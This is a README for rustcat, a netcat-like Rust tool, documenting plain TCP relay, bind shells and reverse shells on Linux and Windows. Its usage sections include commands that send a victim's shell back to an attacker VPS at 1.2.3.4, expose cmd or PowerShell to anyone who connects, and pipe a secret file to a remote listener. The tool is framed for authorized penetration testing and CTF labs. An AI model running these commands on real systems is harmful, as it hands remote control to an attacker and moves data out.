# 🦀 rustcat

> A lightweight, cross-platform **netcat-like** tool written in Rust — supports plain TCP relay, bind shells, and reverse shells on both Linux and Windows.

---

## ⚠️ Legal Disclaimer

> **This tool is intended for authorized security testing, CTF challenges, penetration testing labs, and educational purposes only.**
> Using this tool against systems you do not own or have **explicit written permission** to test is **illegal** and punishable under computer crime laws worldwide (CFAA in the US, Computer Misuse Act in the UK, IT Act in India, etc.).
> **The author is not responsible for any misuse.**

---

## 📦 Installation

### Pre-built Binary

Download the latest binary from the [Releases](../../releases) page.

### Build from Source

**Requirements:** Rust 1.75+ — install from [https://rustup.rs](https://rustup.rs)

> **Windows only:** Also install [Visual Studio C++ Build Tools](https://visualstudio.microsoft.com/visual-cpp-build-tools/) and select **"Desktop development with C++"**.

```bash
git clone https://github.com/yourname/rustcat
cd rustcat
cargo build --release
```

| Platform | Output binary |
|---|---|
| Linux / macOS | `target/release/rustcat` |
| Windows | `target\release\rustcat.exe` |

---

## 🚀 Usage Overview

```
rustcat <COMMAND>

Commands:
  listen    Listen on a port (server / bind shell)
  connect   Connect to a remote host (client / reverse shell)
  help      Print help
```

---

## 📡 Mode 1 — Plain TCP Relay

Works like classic `nc` — relay raw stdin/stdout over TCP.

### Linux / macOS

**Listener (server side):**
```bash
./rustcat listen --port 4444
```

**Connector (client side):**
```bash
./rustcat connect 192.168.1.10 4444
```

### Windows

**Listener:**
```cmd
rustcat.exe listen --port 4444
```

**Connector:**
```cmd
rustcat.exe connect 192.168.1.10 4444
```

> **Tip:** You can pipe data directly, e.g. `echo hello | ./rustcat connect 192.168.1.10 4444`

---

## 🔒 Mode 2 — Bind Shell

The **listener** spawns a shell and exposes it to whoever connects. The attacker connects to the target.

```
Attacker ──── connects to ────▶ Victim (listener with shell)
```

### Linux / macOS

**On the target (victim) — expose a shell:**
```bash
# Using /bin/sh (default)
./rustcat listen --port 4444 --exec

# Using bash explicitly
./rustcat listen --port 4444 --exec --shell /bin/bash
```

**On your machine (attacker) — connect to get the shell:**
```bash
./rustcat connect 192.168.1.10 4444
```

### Windows

**On the target (victim):**
```cmd
# CMD (default on Windows)
rustcat.exe listen --port 4444 --exec

# PowerShell
rustcat.exe listen --port 4444 --exec --shell powershell.exe
```

**On your machine (attacker):**
```cmd
rustcat.exe connect 192.168.1.10 4444
```

---

## 🔄 Mode 3 — Reverse Shell

The **connector** (victim) calls back to the attacker and sends its shell. Useful when the victim is behind NAT or a firewall.

```
Attacker (listener) ◀──── connects back ──── Victim (--exec)
```

### Linux / macOS

**Step 1 — Attacker: start the listener**
```bash
./rustcat listen --port 4444
```

**Step 2 — Victim: connect back and send shell**
```bash
# Send /bin/sh (default)
./rustcat connect 192.168.1.10 4444 --exec

# Send bash
./rustcat connect 192.168.1.10 4444 --exec --shell /bin/bash
```

### Windows

**Step 1 — Attacker: start the listener**
```cmd
rustcat.exe listen --port 4444
```

**Step 2 — Victim: connect back and send shell**
```cmd
# Send CMD (default)
rustcat.exe connect 192.168.1.10 4444 --exec

# Send PowerShell
rustcat.exe connect 192.168.1.10 4444 --exec --shell powershell.exe
```

> Replace `192.168.1.10` with the attacker's **actual IP address**.
> For internet-facing setups, use your **public IP** and forward port 4444 on your router, or run the listener on a **VPS**.

---

## 🔧 All Flags Reference

### `listen`

| Flag | Short | Default | Description |
|---|---|---|---|
| `--port` | `-p` | `4444` | Port to listen on |
| `--exec` | `-e` | off | Spawn a shell on connection |
| `--shell` | | `/bin/sh` (Linux) `cmd.exe` (Win) | Shell binary to use |

### `connect`

| Flag | Short | Default | Description |
|---|---|---|---|
| `host` | | *(required)* | Remote host IP or hostname |
| `port` | | `4444` | Remote port |
| `--exec` | `-e` | off | Send local shell to remote listener |
| `--shell` | | `/bin/sh` (Linux) `cmd.exe` (Win) | Shell binary to use |

---

## 🐚 Shell Options by Platform

| OS | Shell | Flag value |
|---|---|---|
| Linux / macOS | sh | `/bin/sh` |
| Linux / macOS | bash | `/bin/bash` |
| Linux / macOS | zsh | `/bin/zsh` |
| Windows | CMD | `cmd.exe` |
| Windows | PowerShell 5 | `powershell.exe` |
| Windows | PowerShell 7 | `pwsh.exe` |

---

## 🧪 Common Use Cases

### CTF / Lab — quick data transfer
```bash
# Receiver
./rustcat listen --port 9999 > received_file.txt

# Sender
cat secret.txt | ./rustcat connect 192.168.1.10 9999
```

### Port connectivity check
```bash
# Listener
./rustcat listen --port 80

# Tester
./rustcat connect target.com 80
# If connected → port is open and reachable
```

### Authorized penetration test — reverse shell over internet
```bash
# Attacker VPS (public IP: 1.2.3.4)
./rustcat listen --port 4444

# Target (calls back)
./rustcat connect 1.2.3.4 4444 --exec --shell /bin/bash
```

---

## 🏗️ Architecture

```
rustcat
├── listen mode     → TcpListener → accept loop
│   ├── plain       → relay stdin↔net (2 threads)
│   └── --exec      → spawn shell, pipe stdin/stdout/stderr↔net
│
└── connect mode    → TcpStream::connect
    ├── plain       → relay stdin↔net (2 threads)
    └── --exec      → spawn shell, pipe stdin/stdout/stderr↔net
```

Each I/O channel runs in its own thread for non-blocking, concurrent relay.

---

## 🤝 Contributing

Pull requests are welcome. For major changes, open an issue first to discuss what you'd like to change.

---

## 📄 License

[MIT](LICENSE)
